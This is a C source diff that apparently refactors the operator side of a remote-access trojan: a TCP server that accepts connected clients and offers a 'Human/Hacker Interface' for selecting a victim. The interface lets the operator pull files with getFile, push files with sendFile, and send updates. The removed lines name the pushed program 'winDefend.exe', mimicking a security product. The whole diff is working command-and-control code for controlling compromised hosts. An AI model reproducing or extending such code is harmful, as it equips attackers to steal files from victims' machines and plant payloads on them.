@@ -5,31 +5,58 @@
 
 #include "eaSCKTBasicComProtocols.h"
 
-#define PORT 38709
-
-#define PROGRAM_NAME "winDefend.exe"
+#ifndef LISTEN_PORT
+#define LISTEN_PORT 1313
+#endif
 
 static fd_set clients;
 
 #ifndef _WIN32
-static EAScktType big_val;
+static EASCKT big_val;
 #endif
 
+/**
+ * @brief 
+ * 
+ */
 static void commWithSystems(void);
-static void *threadHI(void *param);
-static bool process(EAScktType sckt);
-static bool recvSendText(EAScktType sckt);
 
-int main()
+/**
+ * @brief 
+ * 
+ * @param param 
+ * @return void* 
+ */
+static void *threadHI(void *param);
+
+/**
+ * @brief 
+ * 
+ * @param sckt 
+ * @return true 
+ * @return false 
+ */
+static bool process(EASCKT sckt);
+
+/**
+ * @brief 
+ * 
+ * @param sckt 
+ * @return true 
+ * @return false 
+ */
+static bool recvSendText(EASCKT sckt);
+
+int main(void)
 {
-    if (eaSCKTInit())
+    if (eaSCKTWSStart())
     {
         return EXIT_FAILURE;
     }
 
     commWithSystems();
 
-    eaSCKTFinish();
+    eaSCKTWSEnd();
 
     return 0;
 }
@@ -38,7 +65,7 @@ static void commWithSystems(void)
 {
     // Create TCP Socket
 
-    EAScktType server = socket(AF_INET, SOCK_STREAM, 0);
+    EASCKT server = socket(AF_INET, SOCK_STREAM, 0);
 
     if (SCKT_ERR == server)
     {
@@ -51,15 +78,15 @@ static void commWithSystems(void)
 
     struct sockaddr_in myInfos = {
         .sin_family = AF_INET,
-        .sin_port = htons(PORT),
+        .sin_port = htons(LISTEN_PORT),
         .sin_addr.s_addr = INADDR_ANY,
     };
 
     // Bind socket
 
     if (0 != bind(server, 
-                         (struct sockaddr *)&myInfos, 
-                         sizeof(struct sockaddr)))
+                  (struct sockaddr *)&myInfos, 
+                  (EAScktLen){sizeof(myInfos)}))
     {
         perror("bind");
         eaSCKTClose(server);
@@ -78,6 +105,7 @@ static void commWithSystems(void)
     }
 
     // Create Thread Clients For Human/Hacker Interface :D
+
     pthread_t th;
 
     (void)pthread_create(&th, NULL, threadHI, NULL);
@@ -87,18 +115,20 @@ static void commWithSystems(void)
 
     // For Clients
 
-    for(;;)
+    for (;;)
     {
         struct sockaddr_in clientInfos;
 
-        EAScktType newClient = accept(server, 
-                                      (struct sockaddr *)&clientInfos, 
-                                      &((int){sizeof(clientInfos)}));
+        EASCKT newClient = accept(server, 
+                                  (struct sockaddr *)&clientInfos, 
+                                  &((EAScktLen){sizeof(clientInfos)}));
 
         if (SCKT_ERR == newClient)
         {
             break;
         }
+
+        LOG("New Client %u!!!\n", (unsigned int)newClient);
 
 	    FD_SET(newClient, &clients);
 
@@ -119,56 +149,53 @@ static void *threadHI(void *param)
 
     for (;;)
     {
-        SLEEP(1000);
-
-        puts("Enter Client ID for connection or 0 for refresh\n\n");
+        puts("Client List! Enter Client ID or 0 (0 for refresh)\n\n");
 
 #ifndef _WIN32
-        for (EAScktType client = 1; client <= big_val; client++)
+        for (EASCKT client = 1; client <= big_val; client++)
         if (FD_ISSET(client, &clients))
         {
 #else
         for (unsigned int idx = 0U; idx < clients.fd_count; idx++)
         {
-            EAScktType client = clients.fd_array[idx];
+            EASCKT client = clients.fd_array[idx];
 #endif
-            struct sockaddr_in clientInfos = {0};
 
-            getpeername(client, 
-                        (struct  sockaddr *)&clientInfos, 
-                        &((int){sizeof(struct  sockaddr)}));
-            
-            if (inet_ntoa(clientInfos.sin_addr)[0] != '0')
-            {
-                printf("Client ID : %u ", (unsigned int)client);
-                printf("Client IP %s\n", inet_ntoa(clientInfos.sin_addr));
-            }
+            printf("Client ID : %u ", (unsigned int)client);
         }
 
         unsigned int inp;
 
+        puts("");
         (void)scanf("%u", &inp);
-        fflush(stdin);
+        fflush(stdin); // :(
+        puts("");
 
-        if ((!inp) || !FD_ISSET((EAScktType)inp, &clients))
+        if ((!inp) || !FD_ISSET((EASCKT)inp, &clients))
         {
+            CLEAR_TERMINAL();
+
             continue;
         }
 
-        bool ret = process((EAScktType)inp);
+        bool ret = process((EASCKT)inp);
+
+        CLEAR_TERMINAL();
 
         if (false == ret)
         {
-            FD_CLR((EAScktType)inp, &clients);
-        }
+            printf("Deleted Client! %u\n", inp);
 
-        CLEAR_TERMINAL();
+            FD_CLR((EASCKT)inp, &clients);
+
+            eaSCKTClose((EASCKT)inp);
+        }
     }
 
     return NULL;
 }
 
-static bool process(EAScktType sckt)
+static bool process(EASCKT sckt)
 {
     bool connection = true;
     char text[313 + 1] = {0};
@@ -182,11 +209,12 @@ static bool process(EAScktType sckt)
         puts("\t-> getFile <Path>");
         puts("\t-> sendFile <Path>");
         puts("\t-> update\n");
+        puts("\t-> list\n");
 
         scanf("%313[^\n]", text);
-        fflush(stdin);
+        fflush(stdin); // :(
 
-        if (!strncmp(text, "exit", 4U))
+        if (!strncmp(text, "list", 4U))
         {
             break;
         }
@@ -225,11 +253,11 @@ static bool process(EAScktType sckt)
                 break;
             }
         }
-        else if (!strncmp(text, "update", 6U))
+        else if (!strncmp(text, "update ", 7U))
         {
             connection = false;
 
-            (void)senderFile(sckt, PROGRAM_NAME);
+            (void)senderFile(sckt, &text[7]);
             
             break;
         }
@@ -238,7 +266,7 @@ static bool process(EAScktType sckt)
     return connection;
 }
 
-static bool recvSendText(EAScktType sckt)
+static bool recvSendText(EASCKT sckt)
 {
     char ioStream[4500 + 1];
     bool connection = true;
@@ -270,7 +298,7 @@ static bool recvSendText(EAScktType sckt)
 
             break;
         }
-
+        
         if (!strcmp(ioStream, "exit\n"))
         {
             break;
